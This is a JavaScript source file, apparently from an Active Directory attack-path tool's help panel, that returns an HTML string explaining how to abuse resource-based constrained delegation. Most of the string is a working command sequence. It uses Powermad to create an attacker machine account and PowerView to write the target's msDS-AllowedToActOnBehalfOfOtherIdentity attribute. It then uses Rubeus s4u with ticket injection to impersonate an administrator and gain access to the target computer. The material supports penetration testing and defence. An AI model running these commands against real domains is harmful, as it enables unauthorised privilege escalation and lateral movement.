import { typeFormat } from '../Formatter';
const Abuse = (sourceName, sourceType, targetName, targetType) => {
    let text = `Abusing this primitive is currently only possible through the Rubeus project.
            
    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
    
    `New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`
    
    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
    
    `$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid`
    
    We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
    
    `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)`
    
    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
    
    `Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`
    
    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
    
    `Rubeus.exe hash /password:Summer2018!`
    
    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
    
    `Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt``;
    return { __html: text };
};

export default Abuse;
